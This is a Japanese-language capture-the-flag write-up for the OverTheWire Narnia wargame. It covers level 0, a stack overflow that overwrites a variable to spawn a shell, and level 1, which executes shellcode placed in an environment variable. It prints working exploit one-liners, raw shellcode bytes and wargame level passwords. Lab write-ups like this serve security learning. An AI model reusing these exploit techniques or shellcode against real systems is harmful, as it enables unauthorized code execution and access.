# Narnia

## level 0
narnia0.c
```
#include <stdio.h>
#include <stdlib.h>

int main(){
	long val=0x41414141;
	char buf[20];

	printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
	printf("Here is your chance: ");
	scanf("%24s",&buf);

	printf("buf: %s\n",buf);
	printf("val: 0x%08x\n",val);

	if(val==0xdeadbeef)
		system("/bin/sh");
	else {
		printf("WAY OFF!!!!\n");
		exit(1);
	}

	return 0;
}
```
bufには20文字しか入らない。試しに以下のようにすると
```
$ python -c 'print "A"*20 + "BBBBB"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAABBBB
val: 0x42424242
WAY OFF!!!!
```
21字からの文字がvalの値に上書きされた.

なのでそこを`0xdeadbeef`にできれば良い
```
$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
```
`/bin/sh`が呼ばれるのでコマンドを送る.
```
$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"'; echo 'cat /etc/narnia_pass/narnia1') | /narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
efeidiedae
```

## Level 1
```
#include <stdio.h>

int main(){
	int (*ret)();

	if(getenv("EGG")==NULL){
		printf("Give me something to execute at the env-variable EGG\n");
		exit(1);
	}

	printf("Trying to execute EGG!\n");
	ret = getenv("EGG");
	ret();

	return 0;
}
```
環境変数EGGの値をretに入れて呼び出している。
EGGにシェルコードを入れる.

シェルコードの入手 - http://shell-storm.org/shellcode/
```
\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```
```
// 環境変数に入れる
$ export EGG=`python -c 'print "\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`

narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!

$ cat /etc/narnia_pass/narnia2
nairiepecu
```

## Level 2
